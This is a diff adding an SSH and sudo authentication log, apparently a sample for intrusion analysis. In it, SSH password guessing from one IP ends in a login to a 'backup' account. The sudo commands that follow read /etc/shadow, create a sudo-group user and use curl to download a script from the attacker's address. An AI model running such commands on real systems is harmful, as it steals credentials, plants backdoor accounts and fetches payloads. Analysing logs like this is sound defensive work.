@@ -1,0 +1,46 @@
+Aug 16 07:58:11 web01 systemd[1]: Started Session 41 of user alex.
+Aug 16 07:58:11 web01 sshd[17902]: Accepted publickey for alex from 10.0.0.5 port 50122 ssh2: ED25519 SHA256:q9Ld2xw0y2Cz7r0bq7gkcm3Y7cM1oT8Z9zA1y6XK0jA
+Aug 16 07:58:11 web01 sshd[17902]: pam_unix(sshd:session): session opened for user alex(uid=1000) by (uid=0)
+Aug 16 08:01:33 web01 sudo:     alex : TTY=pts/0 ; PWD=/home/alex ; USER=root ; COMMAND=/usr/bin/apt update
+Aug 16 08:03:10 web01 sudo:     alex : TTY=pts/0 ; PWD=/home/alex ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Aug 16 08:12:45 web01 sshd[17902]: pam_unix(sshd:session): session closed for user alex
+Aug 16 08:12:45 web01 sshd[17902]: Received disconnect from 10.0.0.5 port 50122:11: disconnected by user
+Aug 16 08:40:02 web01 CRON[18110]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Aug 16 08:40:02 web01 CRON[18110]: pam_unix(cron:session): session closed for user root
+Aug 16 08:55:19 web01 sshd[18204]: Failed password for maria from 10.0.0.7 port 49880 ssh2
+Aug 16 08:55:27 web01 sshd[18204]: Accepted password for maria from 10.0.0.7 port 49880 ssh2
+Aug 16 08:55:27 web01 sshd[18204]: pam_unix(sshd:session): session opened for user maria(uid=1001) by (uid=0)
+Aug 16 09:14:02 web01 sshd[18321]: Failed password for root from 45.20.13.8 port 51231 ssh2
+Aug 16 09:14:09 web01 sshd[18321]: Failed password for root from 45.20.13.8 port 51231 ssh2
+Aug 16 09:14:15 web01 sshd[18321]: Failed password for root from 45.20.13.8 port 51231 ssh2
+Aug 16 09:14:15 web01 sshd[18321]: Connection closed by authenticating user root 45.20.13.8 port 51231 [preauth]
+Aug 16 09:14:43 web01 sshd[18325]: Failed password for invalid user admin from 45.20.13.8 port 51240 ssh2
+Aug 16 09:14:50 web01 sshd[18325]: Failed password for invalid user admin from 45.20.13.8 port 51240 ssh2
+Aug 16 09:14:57 web01 sshd[18325]: Failed password for invalid user admin from 45.20.13.8 port 51240 ssh2
+Aug 16 09:14:57 web01 sshd[18325]: Connection closed by invalid user admin 45.20.13.8 port 51240 [preauth]
+Aug 16 09:15:34 web01 sshd[18331]: Failed password for invalid user oracle from 45.20.13.8 port 51255 ssh2
+Aug 16 09:16:07 web01 sshd[18336]: Failed password for invalid user postgres from 45.20.13.8 port 51262 ssh2
+Aug 16 09:16:42 web01 sshd[18340]: Failed password for invalid user test from 45.20.13.8 port 51270 ssh2
+Aug 16 09:17:13 web01 sshd[18344]: Failed password for invalid user deploy from 45.20.13.8 port 51281 ssh2
+Aug 16 09:17:40 web01 sshd[18349]: Failed password for root from 45.20.13.8 port 51290 ssh2
+Aug 16 09:18:00 web01 sshd[18352]: Failed password for backup from 45.20.13.8 port 51298 ssh2
+Aug 16 09:18:47 web01 sshd[18360]: Accepted password for backup from 45.20.13.8 port 51312 ssh2
+Aug 16 09:18:47 web01 sshd[18360]: pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)
+Aug 16 09:19:30 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Aug 16 09:20:02 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/sbin/useradd -m -G sudo support
+Aug 16 09:20:40 web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/curl -s http://45.20.13.8/x.sh -o /tmp/.x
+Aug 16 09:24:15 web01 sshd[18360]: pam_unix(sshd:session): session closed for user backup
+Aug 16 09:31:00 web01 sshd[18204]: pam_unix(sshd:session): session closed for user maria
+Aug 16 10:02:01 web01 sshd[18501]: Failed password for invalid user ubuntu from 45.20.10.2 port 40011 ssh2
+Aug 16 10:02:14 web01 sshd[18503]: Failed password for invalid user pi from 45.20.10.2 port 40018 ssh2
+Aug 16 10:02:27 web01 sshd[18505]: Failed password for invalid user git from 45.20.10.2 port 40025 ssh2
+Aug 16 10:02:40 web01 sshd[18507]: Failed password for invalid user jenkins from 45.20.10.2 port 40032 ssh2
+Aug 16 10:02:54 web01 sshd[18509]: Failed password for invalid user ftpuser from 45.20.10.2 port 40039 ssh2
+Aug 16 10:03:08 web01 sshd[18511]: Failed password for invalid user www-data from 45.20.10.2 port 40046 ssh2
+Aug 16 10:03:22 web01 sshd[18513]: Failed password for invalid user mysql from 45.20.10.2 port 40053 ssh2
+Aug 16 10:03:36 web01 sshd[18515]: Failed password for alex from 45.20.10.2 port 40060 ssh2
+Aug 16 10:03:50 web01 sshd[18517]: Failed password for maria from 45.20.10.2 port 40067 ssh2
+Aug 16 10:03:50 web01 sshd[18517]: Connection closed by authenticating user maria 45.20.10.2 port 40067 [preauth]
+Aug 16 11:15:03 web01 sshd[18640]: Accepted publickey for alex from 10.0.0.5 port 50301 ssh2: ED25519 SHA256:q9Ld2xw0y2Cz7r0bq7gkcm3Y7cM1oT8Z9zA1y6XK0jA
+Aug 16 11:15:03 web01 sshd[18640]: pam_unix(sshd:session): session opened for user alex(uid=1000) by (uid=0)
+Aug 16 11:16:20 web01 sudo:     alex : TTY=pts/0 ; PWD=/home/alex ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/auth.log
